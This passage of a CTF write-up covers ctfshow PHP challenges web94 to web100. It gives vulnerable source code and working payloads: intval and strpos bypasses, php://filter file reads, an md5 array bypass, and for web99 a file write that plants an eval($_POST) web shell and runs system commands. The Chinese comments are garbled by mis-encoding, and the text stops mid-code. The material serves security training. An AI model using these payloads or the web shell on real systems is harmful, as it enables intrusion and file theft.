</code></pre><h2 id="web94"><a class="anchor" href="#web94">#</a> web94</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-18 16:46:19</pre></td></tr><tr><td data-num="9"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>åŸºäºweb93å¯¹å¼€å¤´è¿›è¡Œäº†0çš„è¿‡æ»¤

å¯¹äºstrpos()å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¢è¡Œè¿›è¡Œç»•è¿‡ï¼ˆ%0aï¼‰
payload:?num=%0a010574

ä¹Ÿå¯ä»¥å°æ•°ç‚¹ç»•è¿‡
payloadï¼š?num=4476.0

å› ä¸ºintval()å‡½æ•°åªè¯»å–æ•´æ•°éƒ¨åˆ†
è¿˜å¯ä»¥å…«è¿›åˆ¶ç»•è¿‡(%20æ˜¯ç©ºæ ¼çš„urlç¼–ç å½¢å¼)
payloadï¼š?num=%20010574

?num= 010574 // å‰é¢åŠ ä¸ªç©ºæ ¼
?num=+010574 
?num=+4476.0
</code></pre><h2 id="web95"><a class="anchor" href="#web95">#</a> web95</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-18 16:53:59</pre></td></tr><tr><td data-num="9"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>å¯¹.è¿›è¡Œäº†è¿‡æ»¤

payload:
?num=%0a010574
?num=%20010574
?num= 010574 // å‰é¢åŠ ä¸ªç©ºæ ¼
?num=+010574
</code></pre><h2 id="web96"><a class="anchor" href="#web96">#</a> web96</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-18 19:21:24</pre></td></tr><tr><td data-num="9"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>?u=/var/www/html/flag.php              ç»å¯¹è·¯å¾„
?u=./flag.php                          ç›¸å¯¹è·¯å¾„
?u=php://filter/resource=flag.php      phpä¼ªåè®®
</code></pre><h2 id="web97"><a class="anchor" href="#web97">#</a> web97</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-18 19:36:32</pre></td></tr><tr><td data-num="9"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">else</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">print</span> <span class="token string single-quoted-string">'Wrong.'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><pre><code>æ•°ç»„ç»•è¿‡å³å¯

payload:
a[]=1&amp;b[]=2
</code></pre><h2 id="web98"><a class="anchor" href="#web98">#</a> web98</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>Notice: Undefined index: flag in /var/www/html/index.php on line 15</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>Notice: Undefined index: flag in /var/www/html/index.php on line 16</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>Notice: Undefined index: HTTP_FLAG in /var/www/html/index.php on line 17</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="9"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="10"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="11"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="12"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="13"></td><td><pre># @Last Modified time: 2020-09-18 21:39:27</pre></td></tr><tr><td data-num="14"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>*/</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># å¦‚æœæœ‰ GET ä¼ å‚ï¼Œå°±å˜æˆ POST ä¼ å‚</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># å¦‚æœ GET ä¼ å‚ HTTP_FLAG=flag, å°±æ‰§è¡Œ highlight_file (flag), å¦åˆ™æ‰§è¡Œ highlight_file (__FILE__)</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// GET ä¼ å‚</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>a<span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// POST ä¼ å‚</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token constant">HTTP_FLAG</span><span class="token operator">=</span>flag</pre></td></tr></table></figure><h2 id="web99"><a class="anchor" href="#web99">#</a> web99</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><pre><code>$allowæ˜¯ä¸ªæ•°ç»„ï¼Œé€šè¿‡array_pushå°†éšæœºæ•°æ·»åŠ åˆ°$allowä¸­ã€‚
$allowä¸­å¿…å®šå­˜åœ¨ä¸€ä¸ªæ•°å­—0ã€‚
ç„¶åè¿™é‡Œåˆ©ç”¨in_array()çš„ç‰¹æ€§ï¼Œå¼±æ¯”è¾ƒç‰¹æ€§ï¼Œ'0.php'==0ã€‚
in_arrayå»¶ç”¨äº†phpä¸­çš„==
</code></pre><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>?n=1.php</pre></td></tr><tr><td data-num="2"></td><td><pre>postä¼ å‚</pre></td></tr><tr><td data-num="3"></td><td><pre>content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>è®¿é—®1.php</pre></td></tr><tr><td data-num="5"></td><td><pre>a=system('tac flag36d.php');</pre></td></tr></table></figure><h2 id="web100"><a class="anchor" href="#web100">#</a> web100</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-16 11:25:09</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-21 22:10:28</pre></td></tr><tr><td data-num="9"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">//flag in class ctfshow;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token keyword">eval</span><span class="token 